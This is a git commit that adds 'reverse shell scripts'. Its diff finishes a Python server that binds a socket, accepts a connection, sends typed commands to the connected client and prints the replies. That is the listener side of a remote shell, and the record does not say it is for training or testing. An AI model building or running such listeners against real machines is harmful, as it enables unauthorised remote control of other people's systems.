774e75f6dd93a81355c2d81026cdc55b3c27e867
binoy638 <binoy638@gmail.com>
2022-08-21 20:59:09 +0530

    added reverse shell scripts

--- reverse-shell/server.py
+++ reverse-shell/server.py
@@ -49,3 +49,13 @@ def send_commands(conn):
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), 'utf-8')
+            print(client_response, end="")
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
